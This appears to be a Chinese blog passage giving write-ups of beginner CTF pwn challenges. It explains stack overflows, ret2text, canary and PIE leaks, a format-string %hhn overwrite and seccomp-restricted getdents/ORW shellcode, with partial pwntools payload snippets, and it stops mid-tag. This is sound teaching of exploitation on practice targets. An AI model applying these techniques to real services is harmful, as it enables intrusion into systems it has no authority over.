2.由于题目不是一次上完的，所以顺序上可能不完全与当时一致<br/>     3.附件在GitHub仓库里有</em></strong></h5> <h3 id="-引导之始baby">💓 引导之始(🍼Baby)</h3> <div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-即使引导早已破碎，也请您当上PWN高手。
-
-nc 152.136.11.155 10030
-
-💡 Hint
-一头雾水？你可能需要阅读群文件-&gt;Bin Guideline
-需要一点点命令行操作的知识
-nc是什么？装个Linux吧
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Orchid
-</code></pre></div></div> <h5 id="你室的pwn每年都有的nc就送题">   你室的pwn每年都有的nc就送题</h5> <h3 id="-打地鼠baby">🫨 打地鼠(🍼Baby)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-打不到我，打不到我喵(/≧▽≦)/
-
-nc 152.136.11.155 10031
-
-💡 Hint
-你不会真打算自己打吧
-你可能需要Pwntool
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Orchid
-</code></pre></div></div> <h5 id="依然是你室每年都有的-io-题这题比上一年的-cnss娘中之人-简单一些这个题打就完了上一年的题还需要做分类和模式匹配个人观察来看很多人第三题做了也没有做这个第二题实际上这种-io-题完全不需要-pwn-知识只需要会用-pwntools-里的-io-工具即可究其原因第一ida反编译把大给吓坏了逻辑实现还是比较长的虽然不一定需要去看其次调-io-比较麻烦对于收发字符需要有比较精确的控制-其实pwn就是这样繁琐差错一个字节甚至一个位都不行io-题只是一切的开始喜欢的小伙伴千万不要放弃一点和本题相关的反编译得知玩家输出的地鼠代号是用-getchar-接收的而且只有一个-getchar所以在发送的时候不要使用-sendline否则多出来的-n-会在下一次打地鼠时被接收如果打过算法类竞赛肯定对此深有体会">   依然是你室每年都有的 IO 题，这题比上一年的 <strong><em>CNSS娘中之人</em></strong> 简单一些，这个题打就完了，上一年的题还需要做分类和模式匹配。<br/>   个人观察来看，很多人第三题做了也没有做这个第二题，实际上这种 IO 题完全不需要 pwn 知识，只需要会用 pwntools 里的 IO 工具即可。究其原因，第一IDA反编译把大🔥给吓坏了，逻辑实现还是比较长的（虽然不一定需要去看），其次调 IO 比较麻烦，对于收发字符需要有比较精确的控制 ，其实pwn就是这样繁琐，差错一个字节甚至一个位都不行，IO 题只是一切的开始，喜欢的小伙伴千万不要放弃。<br/>   一点和本题相关的，反编译得知玩家输出的地鼠代号是用 <code class="language-plaintext highlighter-rouge">getchar()</code> 接收的，而且只有一个 <code class="language-plaintext highlighter-rouge">getchar()</code>，所以在发送的时候不要使用 <code class="language-plaintext highlighter-rouge">.sendline()</code>，否则多出来的 <code class="language-plaintext highlighter-rouge">'\n'</code> 会在下一次打地鼠时被接收。如果打过算法类竞赛，肯定对此深有体会。</h5> <h3 id="-not-enougheasy">🥺 not enough(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-快把shell给我！
-
-nc 152.136.11.155 10032
-
-💡 Hint
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Orchid
-</code></pre></div></div> <h5 id="这道题剥去了符号表但实际上也没太大影响核心代码只有一个main和一个手写的改进版read这个改进版read作用就是输入n时终止输入并把其改为0以截断字符串和scanfs差不多但是限制输入量这个改版read很常见并且一般漏洞点不会放在这里面查看12行发现字符串可以越界读写于是可以溢出到v4将其修改为0x114514然后就可以轻松-getshell">   这道题剥去了符号表，但实际上也没太大影响，核心代码只有一个<code class="language-plaintext highlighter-rouge">main()</code>和一个手写的改进版<code class="language-plaintext highlighter-rouge">read()</code>，这个改进版<code class="language-plaintext highlighter-rouge">read()</code>作用就是输入<code class="language-plaintext highlighter-rouge">'\n'</code>时终止输入，并把其改为<code class="language-plaintext highlighter-rouge">'\0'</code>，以截断字符串，和<code class="language-plaintext highlighter-rouge">scanf("%s")</code>差不多，但是限制输入量。这个改版<code class="language-plaintext highlighter-rouge">read()</code>很常见并且一般漏洞点不会放在这里面。<br/>   查看12行，发现字符串可以越界读写，于是可以溢出到<code class="language-plaintext highlighter-rouge">v4</code>，将其修改为<code class="language-plaintext highlighter-rouge">0x114514</code>，然后就可以轻松 <code class="language-plaintext highlighter-rouge">getshell()</code></h5> <h3 id="-were-safe-for-now-or-noteasy">😕 We’re safe… for now… or not?(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-服务器出大锅啦，@XeAm正在紧急抢修系统，好不容易修好了。
-这时，一个刻板印象的黑客大脸出现了，怎么回事？
-
-明明程序main函数里面看起来没有异常，为什么出现了HACKED字样？
-
-请将你的想法整理成PDF或markdown格式，发送到wwworchid39@gmail.com，我将根据你的答案给出flag
-
-如果12小时内未回复请QQ联系。
-
-💡 Hint
-这是一个ELF程序，也就是说你需要Linux下运行
-chmod +x pwn
-动态调试会很管用
-程序的callee是如何返回caller的？
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Orchid
-</code></pre></div></div> <h5 id="很简单复制字符串到目标栈地址上由于没有检查长度和canary导致了-previous-rbp-和-返回地址的最低一位-被覆盖而被覆盖后的地址指向了一个后门函数">   很简单，复制字符串到目标栈地址上，由于没有检查长度和canary，导致了 <strong><em>previous rbp</em></strong> 和 <strong><em>返回地址的最低一位</em></strong> 被覆盖，而被覆盖后的地址指向了一个后门函数。</h5> <h3 id="-im-the-moleeasy">😗 I’m the mole(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-做完😕 We're safe... for now... or not?后，你终于知道漏洞在哪里了，此时你动了点小心思...
-
-nc 152.136.11.155 10035
-
-💡 Hint
-结合之前学到的工具来做！
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Orchid
-</code></pre></div></div> <h5 id="也是保留项目-ret2text运用从上一题学到的栈溢出技术将返回地址修改为后门函数即可-getshell-值得注意的一点是众所周知64位的-system-要求栈地址16位对齐而不是平常的8位具体原因请移步nydn大佬的博客httpsnyyyddddngithubio20230926expe69cace59cb0e4b88de9809ae8bf9ce7a88be9809ae79a84e997aee9a298-涉及其中一个寄存器的问题招新pwn题所有涉及-ret2text-和-system的似乎本地远程都有这个栈平衡的问题对于此题来说最终的-rop-应该是下面这样的">   也是保留项目 <strong><em>ret2text</em></strong>，运用从上一题学到的栈溢出技术，将返回地址修改为后门函数即可 <code class="language-plaintext highlighter-rouge">getshell</code> 。<br/>   值得注意的一点是，众所周知，64位的 <code class="language-plaintext highlighter-rouge">system()</code> 要求栈地址16位对齐，而不是平常的8位（具体原因请移步nydn大佬的博客https://nyyyddddn.github.io/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/ ），涉及其中一个寄存器的问题。<br/>   招新pwn题所有涉及 <strong><em>ret2text</em></strong> 和 <code class="language-plaintext highlighter-rouge">system()</code>的，似乎本地远程都有这个栈平衡的问题，对于此题来说，最终的 <strong><em>ROP</em></strong> 应该是下面这样的。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="err">??????</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">))</span>
-</code></pre></div></div> <h5 id="其他的题还有其他的方法之后会讲">   其他的题还有其他的方法，之后会讲。</h5> <h3 id="️-call-meeasy">☎️ Call Me……(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-……Call Me……
-
-不是，这电话也打不通啊？
-
-🔗 题目地址
-nc 152.136.11.155 10037
-
-📃 题目附件
-点我下载
-
-💡 Hint
-Canary
-Pie
-🚩 Flag格式
-CNSS{meaningful_sentence}
-
-🔨 暴打出题人
-@Timlzh
-</code></pre></div></div> <h5 id="可以感觉到tim出的题很温油后面的一道-heap-也是从这题开始要接触正儿八经的保护措施了这题主要是canary和piecanary金丝雀是栈溢出哨兵如果开启了它栈帧的-last-rbpebp-低一位字长的位置就会填写一字长的随机量然后程序就会在需要栈溢出检查的函数返回之前检查这个随机量如果发现这个量被修改当前函数不返回执行错误处理然后退出注意canary的最低位一定为x00起到截断输出的效果对write没用并且canary的值是全局变量在一个程序的生命周期中不变然后pie和aslr一样是地址随机化的保护技术区别在于aslr是操作系统实现的一般关不掉而且只随机堆栈和动态链接的部分pie是编译器实现的-gcc--no-pie-可以关掉pie可以将textbssdata-等地址也随机化让你打rop更难受不是最后无论怎么随机化都是以页为单位的也就是16进制的后三位不会变化地址之间的偏移也不会变化">   可以感觉到Tim出的题很温油，后面的一道 <strong><em>heap</em></strong> 也是。<br/>   从这题开始要接触正儿八经的保护措施了，这题主要是Canary和Pie。<br/>   Canary（金丝雀）是栈溢出哨兵，如果开启了它，栈帧的 <code class="language-plaintext highlighter-rouge">last rbp/ebp</code> 低一位字长的位置就会填写一字长的随机量，然后程序就会在需要栈溢出检查的函数返回之前检查这个随机量，如果发现这个量被修改，当前函数不返回，执行错误处理（然后退出）。<br/>   注意Canary的最低位一定为<code class="language-plaintext highlighter-rouge">'\x00'</code>，起到截断输出的效果（对<code class="language-plaintext highlighter-rouge">write()</code>没用），并且Canary的值是全局变量，在一个程序的生命周期中不变。<br/>   然后PIE，和ASLR一样是地址随机化的保护技术。区别在于ASLR是操作系统实现的，一般关不掉，而且只随机堆栈和动态链接的部分；PIE是编译器实现的 <code class="language-plaintext highlighter-rouge">gcc -no-pie</code> 可以关掉PIE，可以将<code class="language-plaintext highlighter-rouge">.text</code>、<code class="language-plaintext highlighter-rouge">.bss</code>、<code class="language-plaintext highlighter-rouge">.data</code> 等地址也随机化，让你打ROP更难受（不是）。最后，无论怎么随机化，都是以页为单位的，也就是16进制的后三位不会变化，地址之间的偏移也不会变化。</h5> <h5 id="这个题在输入正好11位的电话号码之前会一直循环打印输入的字符串考虑借此leak-pie-和-canary">   这个题在输入正好11位的电话号码之前，会一直循环打印输入的字符串，考虑借此leak pie 和 canary。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># leak canary
-</span><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="err">????</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># 溢出到canary最低位的\x00，便于输出时带出canary
-# leak pie
-</span><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="err">!!!!</span><span class="p">)</span> <span class="c1"># 正好完全覆盖last_rbp即可
-# ret2backdoor
-</span><span class="n">payload3</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="err">$$$$</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">backdoor</span> <span class="o">+</span> <span class="n">pie_base</span><span class="p">)</span>
-</code></pre></div></div> <h5 id="然后还是system-栈平衡的问题可以向上面一样在-rop-中加入-p64ret--pie_base也可以返回到backdoor-中实际调用-system-的位置由于少了最开头的压栈操作从此处开始调用确实是16位对齐的">   然后还是<code class="language-plaintext highlighter-rouge">system()</code> 栈平衡的问题，可以向上面一样，在 ROP 中加入 <code class="language-plaintext highlighter-rouge">p64(ret + pie_base)</code>，也可以返回到<code class="language-plaintext highlighter-rouge">backdoor()</code> 中实际调用 <code class="language-plaintext highlighter-rouge">system()</code> 的位置，由于少了最开头的压栈操作，从此处开始调用确实是16位对齐的。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">public</span> <span class="n">bug</span>
-<span class="n">bug</span> <span class="n">proc</span> <span class="n">near</span>
-<span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
-<span class="n">endbr64</span>
-<span class="n">push</span>    <span class="n">rbp</span>
-<span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
-<span class="n">lea</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">command</span>    <span class="p">;</span> <span class="s">"/bin/sh"</span>  <span class="o">&lt;----------</span><span class="err">直接</span><span class="n">ret</span><span class="err">到这个位置</span>
-<span class="n">mov</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>        <span class="p">;</span> <span class="n">command</span>
-<span class="n">call</span>    <span class="n">_system</span>
-<span class="n">mov</span>     <span class="n">edi</span><span class="p">,</span> <span class="mi">0</span>          <span class="p">;</span> <span class="n">status</span>
-<span class="n">call</span>    <span class="n">_exit</span>
-<span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 128D</span>
-<span class="n">bug</span> <span class="n">endp</span>
-</code></pre></div></div> <h3 id="-happy-sugar-lifemid">🐦‍⬛ happy sugar life(🤖Mid)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-潮水褪去，在阳光下剥落出的白色晶胞
-尝之，口感咸鲜回甘
-
-据传是对付羽兽的宝物
-吸食一粒即会毙命
-
-幽暗森林里的歌声回响
-祂是光明、也是救赎
-亦不知将被尖锐的血色吞没
-
-喜食糖物，于是祂飞向了海边……
-
-💡 Hint
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Astesia
-</code></pre></div></div> <h6 id="hintcanary--n金丝雀-其次canary可能发音与candy有部分相近吧">   Hint+：Canary == n.金丝雀; 其次Canary可能发音与Candy有部分相近吧（</h6> <h5 id="所以这一题还是想办法绕过canary保护然后返回到后门函数实际上这一题比上一题上题上得早一些">   所以这一题还是想办法绕过Canary保护，然后返回到后门函数。实际上这一题比上一题上题上得早一些。<br/>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">sugar_salt</span><span class="p">()</span>
-<span class="p">{</span>
-  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-38h]</span>
-  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-34h]</span>
-  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-30h] BYREF</span>
-  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]</span>
-
-  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
-  <span class="n">strcpy</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"We don't need a canaria. I'll kill you!"</span><span class="p">);</span>
-  <span class="n">v2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
-  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">40</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span> <span class="c1">// &lt;---------- 漏洞</span>
-    <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">"Satou:%s"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span> <span class="c1">// &lt;---------- leak canary and stack</span>
-  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x28uLL</span><span class="p">);</span> 
-  <span class="n">printf</span><span class="p">(</span><span class="s">"Shio:"</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span> <span class="c1">// &lt;-------- 格式化字符串漏洞</span>
-  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div></div> <h5 id="漏洞在for--i--v2-i--40-i-也是c语言新手常犯的错误下标是0开始的所以这里正好-offset-by-one--把canary最低位覆盖之后又自带一个输出就把canary泄露了可以看到第二遍输入没有越界写但是有格式化字符串漏洞所以这个格式化字符串漏洞做两件事一是修复canary最低位为x00二是改返回地址然后一件事由于我们要改栈上的内容于是需要指向栈某些位置的指针进而需要泄露栈地址幸好栈地址也和canary一起泄露了大致的payload如下使用hhn而不是n修改单个字节">   漏洞在<code class="language-plaintext highlighter-rouge">for ( i = v2; i &lt;= 40; ++i )</code>，也是c语言新手常犯的错误，下标是0开始的，所以这里正好 <strong><em>offset-by-one</em></strong> , 把Canary最低位覆盖，之后又自带一个输出就把Canary泄露了。<br/>   可以看到第二遍输入没有越界写，但是有格式化字符串漏洞。所以这个格式化字符串漏洞做两件事，一是修复Canary最低位为<code class="language-plaintext highlighter-rouge">'\x00'</code>，二是改返回地址。<br/>   然后一件事，由于我们要改栈上的内容，于是需要指向栈某些位置的指针，进而需要泄露栈地址，幸好栈地址也和Canary一起泄露了。<br/>   大致的payload如下，使用<code class="language-plaintext highlighter-rouge">%hhn</code>而不是<code class="language-plaintext highlighter-rouge">%n</code>修改单个字节。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="o">|</span><span class="mh">0xff</span> <span class="o">-</span> <span class="mh">0xff</span>
-<span class="n">last_rbp</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span> <span class="c1"># 栈地址的一般高两位是空的
-</span><span class="n">rbp</span> <span class="o">=</span> <span class="n">last_rbp</span> <span class="o">-</span> <span class="n">offset</span> <span class="c1"># offset 是定值
-</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%{argv1_offset}$hhn</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%{amount}c</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%{argv2_offset}$hhn</span><span class="sh">'</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="err">????</span> <span class="c1"># 确保接下来的两个指针参数按八位对齐。
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>
-</code></pre></div></div> <h6 id="然后这个backdoor也是有栈平衡的问题解决方式和上一题一致">   然后这个<code class="language-plaintext highlighter-rouge">backdoor()</code>也是有栈平衡的问题，解决方式和上一题一致。</h6> <h3 id="-s代表着mid">🤔 s代表着…(🤖Mid)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-塞克考姆城的神奇旗帜
-其真名会随时间而变化
-
-据说只有呼唤出正确的名号
-才能被举起挥舞
-
-如坚实的巨树，屹立不倒
-如敏捷的幻象，若即若离
-如神圣的光芒，指引胜利
-
-筛尔寇德？挥舞旗帜的第一勇士。
-
-💡 Hint
-flag文件名并非"./flag"、"./flag.txt"等
-注意沙箱中被允许的系统调用
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Astesia
-</code></pre></div></div> <h6 id="已经告诉了s代表shellcode">   已经告诉了s代表shellcode。</h6> <h5 id="checksec魅力时刻有rwx段但就是不提示只能gdb调试看看">   checksec魅力时刻，有rwx段，但就是不提示，只能gdb调试看看。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>checksec pwn5
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/pwn/worktable/cnss2024/pwn5'</span>
-    Arch:       amd64-64-little
-    RELRO:      Full RELRO
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        PIE enabled   &lt;<span class="nt">-----</span> 注意开了PIE
-    SHSTK:      Enabled
-    IBT:        Enabled
-    Stripped:   No
-</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
-             Start                End Perm     Size Offset File
-       0x142857000        0x142858000 rwxp     1000      0 <span class="o">[</span>anon_142857]
-    0x555555554000     0x555555555000 r--p     1000      0 /home/pwn/worktable/cnss2024/pwn5
-    0x555555555000     0x555555556000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/pwn5
-    0x555555556000     0x555555557000 r--p     1000   2000 /home/pwn/worktable/cnss2024/pwn5
-    0x555555557000     0x555555558000 r--p     1000   2000 /home/pwn/worktable/cnss2024/pwn5
-    0x555555558000     0x555555559000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/pwn5
-    0x7ffff7d60000     0x7ffff7d63000 rw-p     3000      0 <span class="o">[</span>anon_7ffff7d60]
-</code></pre></div></div> <h6 id="第一个就是">   第一个就是。<br/></h6> <h5 id="注意到开了sandbox">   注意到开了sandbox</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> line  CODE  JT   JF      K
-<span class="o">=================================</span>
- 0000: 0x20 0x00 0x00 0x00000004  A <span class="o">=</span> <span class="nb">arch
- </span>0001: 0x15 0x00 0x0b 0xc000003e  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> ARCH_X86_64<span class="o">)</span> goto 0013
- 0002: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
- 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto 0005
- 0004: 0x15 0x00 0x08 0xffffffff  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0xffffffff<span class="o">)</span> goto 0013
- 0005: 0x15 0x06 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto 0012
- 0006: 0x15 0x05 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> write<span class="o">)</span> goto 0012
- 0007: 0x15 0x04 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> open<span class="o">)</span> goto 0012
- 0008: 0x15 0x03 0x00 0x00000003  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> close<span class="o">)</span> goto 0012
- 0009: 0x15 0x02 0x00 0x00000009  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> mmap<span class="o">)</span> goto 0012
- 0010: 0x15 0x01 0x00 0x0000004e  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> getdents<span class="o">)</span> goto 0012
- 0011: 0x15 0x00 0x01 0x0000005a  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> <span class="nb">chmod</span><span class="o">)</span> goto 0013
- 0012: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
- 0013: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
-</code></pre></div></div> <h5 id="由于hint提示flag名称未知所以我们需要使用图中getdents先获取当前列表的所有文件信息然后再打一个orw注意k那一列是具体的系统调用号网上都教64位用getdents64但它的调用号这题被ban了用getdents本身也足够了问了出题人flag的名称每1s变一次所以才给了两次shellcode的机会然后注意一点第一遍shellcode要有压栈和返回的操作不然到这就segv了没有第二次shellcode的机会开辟0x200栈空间信息直接放在栈上">   由于Hint提示flag名称未知，所以我们需要使用图中<code class="language-plaintext highlighter-rouge">getdents</code>先获取当前列表的所有文件信息，然后再打一个ORW。<br/>   注意<code class="language-plaintext highlighter-rouge">K</code>那一列，是具体的系统调用号，网上都教64位用<code class="language-plaintext highlighter-rouge">getdents64</code>，但它的调用号这题被ban了，用<code class="language-plaintext highlighter-rouge">getdents</code>本身也足够了。<br/>   问了出题人，flag的名称每1s变一次，所以才给了两次shellcode的机会。<br/>   然后注意一点，第一遍shellcode要有压栈和返回的操作，不然到这就SEGV了，没有第二次shellcode的机会。<br/>   开辟0x200栈空间，信息直接放在栈上。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode1 <span class="o">=</span> <span class="s1">'''
-    push rbp
-    mov rbp, rsp
-    sub rsp, 0x200
-'''</span>
-shellcode1 +<span class="o">=</span> shellcraft.open<span class="o">(</span><span class="s2">"./"</span><span class="o">)</span>
-shellcode1 +<span class="o">=</span> shellcraft.getdents<span class="o">(</span>3, <span class="s2">"rsp"</span>, 0x200<span class="o">)</span>
-shellcode1 +<span class="o">=</span> shellcraft.write<span class="o">(</span>1, <span class="s2">"rsp"</span>, 0x200<span class="o">)</span>
-shellcode1 +<span class="o">=</span> <span class="s1">'''
-        leave
-        ret
-'''</span>
-
-shellcode2 <span class="o">=</span> <span class="o">{</span><span class="nv">$orw</span><span class="o">}</span>
-</code></pre></div></div> <h5 id="博主写的时候由于用的wsl不知为何wsl上pwntools的asm很慢导致两次shellcode间隔超过1sflag文件名已经变了死活过不了后来用虚拟机直接过">   博主写的时候由于用的wsl，不知为何wsl上pwntools的asm()很慢，导致两次shellcode间隔超过1s，flag文件名已经变了，死活过不了，后来用虚拟机直接过😅。</h5> <h3 id="-头号玩家mid">😎 头号玩家(🤖Mid)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-隐匿在品学楼之中的幽灵，
-不可观测，难以言喻
-
-旧时，会有许多人前去寻找他，
-或恐惧、或期待
-
-话虽如此，
-真正的他，或许早已被人忘却
-
-💡 Hint
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Orchid
-</code></pre></div></div> <h5 id="谜语人题目前置知识是看过头号玩家至少是电影中的第一关实现逻辑比较长这里就不贴了简单来说就是根据程序的随机输出做一个类似yes-or-no的游戏初始有30分50次机会答对一次加一分错一次减一分玩完之后有一个读入字符串的机会有多少分就可以读多少字符本题依然checksec魅力时刻">   谜语人题目，前置知识是看过头号玩家（至少是电影中的第一关）<br/>   实现逻辑比较长，这里就不贴了，简单来说就是根据程序的随机输出，做一个类似Yes or No的游戏，初始有30分，50次机会，答对一次加一分，错一次减一分。玩完之后，有一个读入字符串的机会，有多少分就可以读多少字符。<br/>   本题依然checksec魅力时刻</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PainTech:/home/pwn/worktable/cnss2024# checksec pwn6
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/pwn/worktable/cnss2024/pwn6'</span>
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-    Stripped:   No
-</code></pre></div></div> <h5 id="显示canary-found实际上根本没有一般题目可以在ida中去找找__stack_chk_fail函数如果有就是有canary但本题静态链接东西多不好找所以动调看rbp---0x8有没有canary发现没有">   显示<code class="language-plaintext highlighter-rouge">Canary found</code>，实际上根本没有。一般题目可以在IDA中去找找<code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>函数，如果有就是有Canary；但本题静态链接，东西多不好找，所以动调看<code class="language-plaintext highlighter-rouge">rbp - 0x8</code>有没有Canary，发现没有。<br/></h5> <h5 id="本题的打法有两种先说正解也就是和头号玩家有关系的解法">   本题的打法有两种，先说正解，也就是和头号玩家有关系的解法。</h5> <p><img src="https://www.helloimg.com/i/2024/09/27/66f617fc16ef9.png" alt="Screenshot 2024-09-27 103245.png"/></p> <h5 id="关键点在于正着开不行要你倒着开由于没canary所以要打一个栈溢出但问题是如果全部答对也只有80字节这个大小只够恰好覆盖到返回地址根本不够ropchain">   关键点在于正着开不行要你倒着开。由于没Canary，所以要打一个栈溢出，但问题是如果全部答对，也只有80字节，这个大小只够恰好覆盖到返回地址，根本不够ROPchain</h5> <div class="language-c 